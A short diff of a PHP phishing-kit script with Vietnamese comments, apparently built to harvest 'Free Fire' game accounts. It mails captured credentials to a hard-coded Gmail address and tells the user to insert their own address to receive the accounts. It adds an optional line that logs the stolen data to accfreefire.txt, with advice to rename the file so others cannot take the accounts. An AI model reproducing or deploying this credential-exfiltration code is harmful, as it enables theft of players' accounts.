@@ -9,7 +9,10 @@
       //___________________________
       mail("sharefree2222@gmail.com", $headers, $body); 
       // Thay tên gmail của bạn vào @gmail.com để acc về nhé
-     //đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+     //$test = fopen("accfreefire.txt","a");
+//muốn xem acc tại host thì bạn xóa // trước $test = fopen("accfreefire.txt","a"); đi nhé
+//đổi tên file accfreefire.txt này để tránh trường hợp người khác vào lấy acc
+
      fwrite($test,$body);
      fclose($test); 
    }
